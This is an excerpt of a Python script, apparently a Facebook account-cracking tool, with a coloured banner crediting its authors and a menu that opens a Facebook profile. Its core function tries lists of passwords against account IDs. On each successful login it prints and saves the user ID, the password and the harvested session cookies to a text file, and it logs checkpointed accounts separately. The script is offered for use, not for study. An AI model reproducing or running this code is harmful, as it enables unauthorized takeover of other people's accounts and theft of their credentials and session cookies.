...
\033[33;1m╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{A}──────────────────────────────────────────────────
 {A}({X1}+{A}){G1} OWNER    {A}:{G1} KTM390-CYBER
 {A}({X1}+{A}){G2} FACEBOOK {A}:{G2} SALMAN FARSI
 {A}({X1}+{A}) {G3}TOOLTYPE {A}:{G3} ALL IN ONE... 
{A}──────────────────────────────────────────────────"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
def Main():
    ...
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.akash');Main()
    else:Main()
...
def rndmx(ids,pasx,tl):
        ...
        f=random.choice(['+','-'])
        sys.stdout.write(f'\r{G5} ({A}SALMAN-XD{G5}) ({X2}{f}{loop}{R}) ({M}{str(ids)}{R}) ({G2}+{len(ok)}{w}|{R}-{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
    ...
    'viewport-width': '980',}
                        ...
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{R}[{G1}SALMAN_ok{R}]{G1} {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{A}>{R}[🍥]{A}<{G3} {coki} ')
                                open('/sdcard/SALMAN-XD-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{R}[{R}ELITE-CP{R}]{R} {str(uid)} | {pas} ')
                                open('/sdcard/SALMAN-XD-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
